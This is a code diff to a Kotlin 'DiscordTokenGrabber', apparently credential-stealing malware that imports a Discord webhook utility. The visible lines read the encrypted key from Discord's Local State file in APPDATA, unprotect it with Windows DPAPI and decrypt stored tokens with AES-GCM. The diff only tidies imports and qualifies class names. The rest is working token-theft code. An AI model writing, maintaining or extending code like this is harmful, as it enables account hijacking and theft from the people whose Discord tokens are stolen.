@@ -6,7 +6,6 @@ import utils.DiscordWebhook
 import java.io.BufferedReader
 import java.io.File
 import java.io.FileReader
-import java.io.IOException
 import java.util.*
 import javax.crypto.Cipher
 import javax.crypto.spec.GCMParameterSpec
@@ -47,14 +46,14 @@ object DiscordTokenGrabber {
         BufferedReader(FileReader(File("${System.getenv("APPDATA")}\\discord\\Local State"))).use { brs ->
             var line: String?
             while (brs.readLine().also { line = it } != null) {
-                return JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key")
+                return org.json.JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key")
             }
         }
         return null
     }
 
     private fun decrypt(token: ByteArray, key: ByteArray): String {
-        val finalKey = Crypt32Util.cryptUnprotectData(key)
+        val finalKey = com.sun.jna.platform.win32.Crypt32Util.cryptUnprotectData(key)
         val finalToken = ByteArray(12) { i -> token[i + 3] }
         val data = ByteArray(token.size - 15) { i -> token[i + 15] }
         val cipher = Cipher.getInstance("AES/GCM/NoPadding")
